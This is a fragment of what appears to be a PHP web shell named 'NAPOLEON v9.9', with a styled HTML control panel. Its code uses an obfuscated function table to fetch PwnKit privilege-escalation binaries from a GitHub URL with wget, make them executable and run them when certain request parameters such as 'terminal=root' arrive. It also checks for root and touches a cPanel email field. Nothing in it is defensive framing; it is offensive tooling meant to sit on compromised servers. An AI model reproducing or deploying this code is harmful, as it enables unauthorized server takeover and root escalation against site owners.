...
<body class="cyber-terminal">
    ...
    <div class="flex h-screen overflow-hidden">
        <div class="sidebar glass-effect h-full fixed left-0 top-0 overflow-y-auto cyber-border">
            <div class="p-4">
                <div class="flex items-center justify-between mb-6 md:flex hidden">
                    <div class="flex items-center">
                        ...
                        <h1 class="text-xl font-bold cyber-font">NAPOLEON<span class="text-blue-400 cyber-glow">v9.9</span></h1>
                    </div>
            ...
            <center><img src='https://meranggijaya-desa.id/img/napoleon.png' height='15' width='75' referrerpolicy='unsafe-url' /></center>
        </div>
        <?php
                    ...
                    if (isset($r_text[0]) && $r_text[0] === "uid=0(root)") {
                        ...
                        if (!$fungsi[3]('pwnkit32')) {
                            if ($fungsi[4]($fungsi[0]())) {
                                $fungsi[28]("pwnkit32", $fungsi[11]("https://github.com/hesonakara-dot/PWN/raw/refs/heads/main/PwnKit32"));
...
if ($_GET['terminal'] == "root") {
    if (!$fungsi[3]('pwnkit') && $fungsi[4]($fungsi[0]())) {
        $fungsi[28]("pwnkit", $fungsi[11]("https://github.com/hesonakara-dot/PWN/raw/refs/heads/main/PwnKit"));
        cmd('chmod +x pwnkit');
...
"email" : "' . $emailCp . '"
    ...
    if ($_POST['create_folder'] == true) {
        ...
        if (!$fungsi[3]('pwnkit')) {
            cmd('wget https://github.com/hesonakara-dot/PWN/raw/refs/heads/main/PwnKit -O pwnkit');
            cmd('chmod +x pwnkit');
